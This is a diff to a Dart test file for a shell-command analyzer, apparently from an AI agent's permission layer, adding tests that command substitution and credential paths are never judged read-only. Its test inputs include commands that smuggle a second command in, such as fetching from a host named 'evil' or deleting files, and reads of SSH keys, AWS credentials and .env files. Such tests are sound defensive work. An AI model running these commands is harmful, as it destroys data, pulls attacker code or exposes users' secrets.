@@ -30,7 +30,6 @@ void main() {
         'head -20 file.txt',
         'tail -f app.log',
         'pwd',
-        r'echo $PATH',
         'which dart',
         'whoami',
         'git status',
@@ -75,6 +74,53 @@ void main() {
           reason: 'expected side-effect: $cmd',
         );
       }
+    });
+
+    test('command substitution / expansion is never read-only', () {
+      // $() 与反引号内的任意命令会在 shell 中先执行,只读判定必须拒绝
+      for (final cmd in [
+        r'echo $(git push --force)',
+        r'echo $(rm -rf /tmp/x)',
+        r'ls $(npm install -g evil)',
+        r'git log --format=$(curl -o /tmp/x http://evil/x)',
+        r'echo `rm -f /tmp/x`',
+        r'echo $PATH',
+        r'echo ${PATH}',
+        r'cat $(ls ~/.ssh)',
+      ]) {
+        expect(
+          CommandAnalyzer.isReadOnlyCommand(cmd),
+          isFalse,
+          reason: 'expected not read-only: $cmd',
+        );
+      }
+    });
+
+    test('sensitive paths are never read-only even in whitelist', () {
+      for (final cmd in [
+        'cat ~/.ssh/id_rsa',
+        'cat ~/.ssh/authorized_keys',
+        'cat ~/.aws/credentials',
+        'cat /home/u/proj/.env',
+        'cat .env.local',
+        'grep secret ~/.athena/permissions.json',
+        'ls ~/.aws/',
+      ]) {
+        expect(
+          CommandAnalyzer.isReadOnlyCommand(cmd),
+          isFalse,
+          reason: 'expected not read-only (sensitive): $cmd',
+        );
+      }
+    });
+
+    test('containsSensitivePath detects credential paths', () {
+      expect(CommandAnalyzer.containsSensitivePath('cat ~/.ssh/id_rsa'),
+          isTrue);
+      expect(CommandAnalyzer.containsSensitivePath('cat ~/.aws/credentials'),
+          isTrue);
+      expect(CommandAnalyzer.containsSensitivePath('cat README.md'), isFalse);
+      expect(CommandAnalyzer.containsSensitivePath('ls lib/src'), isFalse);
     });
   });
 
